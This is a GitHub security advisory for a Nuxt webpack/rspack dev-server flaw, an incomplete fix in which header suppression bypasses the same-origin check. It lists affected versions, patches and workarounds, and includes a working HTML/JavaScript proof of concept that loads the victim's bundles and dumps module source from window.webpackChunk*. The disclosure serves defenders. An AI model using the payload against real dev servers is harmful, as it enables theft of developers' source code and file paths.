# [M] @nuxt/webpack-builder and @nuxt/rspack-builder dev server same-origin check bypassed when Sec-Fetch-Site, Origin, and Referer are all absent (incomplete fix for GHSA-6m52-m754-pw2g)

## Summary
Severity: Medium
Advisory: GHSA-x6qj-4h56-5rj5
CVE: CVE-2026-49993
CWE: CWE-749
Ecosystem: npm
CVSS: CVSS:4.0/AV:A/AC:H/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-x6qj-4h56-5rj5
Type: github-advisory

## Affected
- npm: `@nuxt/webpack-builder` — affected >=4.0.0 <4.4.7
- npm: `@nuxt/webpack-builder` — affected >=3.15.4 <3.21.7
- npm: `@nuxt/rspack-builder` — affected >=4.0.0 <4.4.7
- npm: `@nuxt/rspack-builder` — affected >=3.15.4 <3.21.7

## Details
### Summary
This is an incomplete fix for [GHSA-6m52-m754-pw2g](https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g). Source code may still be stolen during dev when using the webpack / rspack builder if the dev server is bound to a non-loopback address (e.g. `nuxt dev --host`) and the developer opens a malicious site on the same network.

### Details
The fix for [GHSA-6m52-m754-pw2g](https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g) added an `Origin` / `Referer` fallback to the dev-middleware same-origin check, with a `return true` branch when neither header is present so that non-browser clients (curl, the HMR client, address-bar navigation) keep working.

That fallback is bypassed when a cross-origin attacker request reaches the dev server with all three signal headers absent:

- `Sec-Fetch-Site` is [not sent by browsers to non-potentially-trustworthy destinations](https://w3c.github.io/webappsec-fetch-metadata/#sec-fetch-site-header) (HTTP on a non-loopback address).
- `Origin` is not sent on non-CORS subresource fetches (a bare `<script>` with no `crossorigin`).
- `Referer` can be suppressed by the attacker page with `<meta name="referrer" content="no-referrer">` or `referrerpolicy="no-referrer"` on the `<script>` element.

A classic `<script src="http://VICTIM_LAN_IP:3000/_nuxt/app.js" referrerpolicy="no-referrer">` from a non-trustworthy attacker origin produces exactly that header set, the request is allowed, and the attacker page can read the built source out of `window.webpackChunk*` via `Function.prototype.toString()`.

Since the attack requires the dev server to be reachable via a non-potentially-trustworthy origin, only apps using `--host` (or `--host 0.0.0.0`) are affected. Chrome 142+ users are also protected by [Local Network Access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).

### PoC
1. Create a Nuxt project with the webpack / rspack builder.
1. Run `npm run dev -- --host 0.0.0.0`.
1. Open `http://localhost:3000` on the developer machine.
1. From a different LAN host, serve the page below and open it in the same browser.
1. The compiled module source is exfiltrable from `window.webpackChunknuxt_<projectname>`.

```html
<!doctype html>
<meta name="referrer" content="no-referrer">
<script>
  ['/_nuxt/runtime.js', '/_nuxt/app.js'].forEach(p => {
    const s = document.createElement('script')
    s.src = 'http://VICTIM_LAN_IP:3000' + p
    s.referrerPolicy = 'no-referrer'
    document.head.appendChild(s)
  })
  setTimeout(() => {
    const key = Object.keys(window).find(k => k.startsWith('webpackChunk'))
    for (const [, mods] of window[key]) {
      for (const id in mods) {
        console.log(id, mods[id].toString())
      }
    }
  }, 1500)
</script>
```

### Impact
Users using the webpack / rspack builder with `nuxt dev --host` may get the built source code read by malicious websites on the same network, including module identifiers, the developer's local filesystem path, and any developer-controlled strings inlined into the bundle.

This vulnerability does not affect Chrome 142+ (and other Chromium-based browsers) users due to [Local Network Access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).

The default Vite builder is not affected.

### Patches
Fixed in `@nuxt/webpack-builder@4.4.7` / `@nuxt/rspack-builder@4.4.7` and backported to `@nuxt/webpack-builder@3.21.7` / `@nuxt/rspack-builder@3.21.7` by [#35200](https://github.com/nuxt/nuxt/pull/35200) (4.x: commit [`e351de94`](https://github.com/nuxt/nuxt/commit/e351de943e82db16970618b60dc7fdbaa58630f3); 3.x: commit [`77187ee4`](https://github.com/nuxt/nuxt/commit/77187ee4015e9267fb464951542a3e09e8b5fa05)). The dev-middleware same-origin check now treats a request with no `Sec-Fetch-Site`, no `Origin`, and no `Referer` as same-origin only when the dev server is loopback-bound, closing the header-suppression bypass.

The fix only ships for the `@nuxt/webpack-builder` and `@nuxt/rspack-builder` packages. The default Vite builder was not affected.

### Workarounds
If you cannot upgrade immediately:

- Don't use `nuxt dev --host`. Bind the dev server to `localhost` (the default) and tunnel from other devices via SSH or a reverse proxy that enforces same-origin checks.
- Use Chrome 142+ or another Chromium-based browser that enforces [Local Network Access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).
- Switch to the Vite builder for development.

### Credit
Reported by Berkan SAL ([@Uhudsavasindankacanokcu2](https://github.com/Uhudsavasindankacanokcu2)) via the Vercel Open Source HackerOne program.

Independently reported by [@DavidCarliez](https://github.com/DavidCarliez) via GitHub's coordinated disclosure flow (`GHSA-xw96-2f5x-v9pv`), closed as a duplicate of this advisory.

## References
- https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g
- https://github.com/nuxt/nuxt/security/advisories/GHSA-x6qj-4h56-5rj5
- https://nvd.nist.gov/vuln/detail/CVE-2026-49993
- https://github.com/nuxt/nuxt/pull/35200
- https://github.com/nuxt/nuxt/commit/77187ee4015e9267fb464951542a3e09e8b5fa05
- https://github.com/nuxt/nuxt/commit/e351de943e82db16970618b60dc7fdbaa58630f3
- https://github.com/nuxt/nuxt
